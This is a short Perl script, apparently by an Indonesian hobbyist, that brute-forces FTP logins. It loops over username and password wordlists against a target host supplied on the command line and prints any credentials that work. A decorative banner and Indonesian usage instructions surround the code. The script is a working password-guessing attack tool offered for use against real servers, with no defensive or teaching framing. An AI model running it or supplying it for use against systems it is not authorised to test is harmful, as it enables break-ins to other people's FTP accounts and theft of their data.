#!/usr/bin/tamfan/perl
#Mau Ngapain ? mau recorde ya ? izin dulu ke 0859-6634-6141
#Kalo Ga Izin Mungkin Syntax v:
#Sengaja Ini Ga Gua Encrypt... Harus Izin... By Prakasa Jr64

use Net::FTP;
use Term::ANSIColor;
$datestring = localtime();

#Dibawah Ini Adalah Untuk Banner ^_^

system('clear'); #untuk windows bisa ubah jadi cls ^_^ by prakasa_jr64

print color 'bold white';
print<<prakasajr;

Hari-Bulan-Tanggal-Jam : $datestring
prakasajr
print color 'bold green';
print<<jrjr;
╔═════ ╔══╦══╗ ╔═════╗   ╔══╦══╗ ╔═════╗ ╔═════╗ ╦     ╦
║         ║    ║     ║      ║    ║     ║ ║     ╩ ║     ║
║         ║    ║     ║      ║    ║     ║ ║       ║     ║
╠═════    ║    ╠═════╝      ║    ╠═╦═══╝ ╠═════╗ ╚═════╬═
║         ║    ║            ║    ║ ╚══╗  ║     ║       ║
╩         ╩    ╩        ╚═══╝    ╩    ╩  ╚═════╝       ╩
jrjr
print color 'bold red';
print<<akasganteng;
╔════════════════════════════════════════════════════════╗
║ •Script Berbasi Perl By : Prakasa Jr64 Atau MrTamfanX• ║
║ •YT : Tutorial MrTamfanX Web: http://prakasap.eu5.org• ║
╚════════════════════════════════════════════════════════╝
akasganteng
print color 'bold white';
print<<kakas;

kakas
print color 'bold yellow';

#Cara Menggunakan Dan Jalankannya ^_^ By Prakasa_Jr64
$host=$ARGV[0]|| die 
"Gunakan: prakasajr <localhost>\nJalankan Untuk Windows: ./prakasajr.pl 45.64.1.52 \nJalankan Di Termux: perl prakasajr.pl 45.64.1.52\n";

# Disini anda harus menggunakan wordlist user.txt
open(MrTamfanX,"< ./users.txt") or die "users.txt anda belum ada\n"; 
chomp(my @user = <MrTamfanX>); 


# Disini anda harus menggunakan worlist pass.txt 
open(PrakasaJr,"< ./pass.txt") or die "pass.txt anda belum ada\n"; 
chomp(my @passs = <PrakasaJr>); 


#user dan pass akan di jalankan
foreach(sort @user){   
foreach my $pass (sort @passs){   

#Sedang koneksi ke FTP Prakasa Jr64
my $f = Net::FTP->new("$host",
		Debug => 1,
		Passive=>0) or die "FTP dari server gagal menyambungkan koneksi!!\n";

#Menuju Sukses Login By Prakasa Jr64
if ($f->login($_,$pass)){
print "\t\n";
print color 'bold yellow';
print "[•]Selamat Brute Force Anda Berhasil, Terima Kasih Prakasa Jr64\n\n";
print color 'reset';
print color 'bold red';
print "[!]FTP-server: $host\n";
print "[!]FTP-user: $_\n";
print "[!]FTP-pass: $pass\n";
print color 'reset';
print "\n\n";
}
}
}
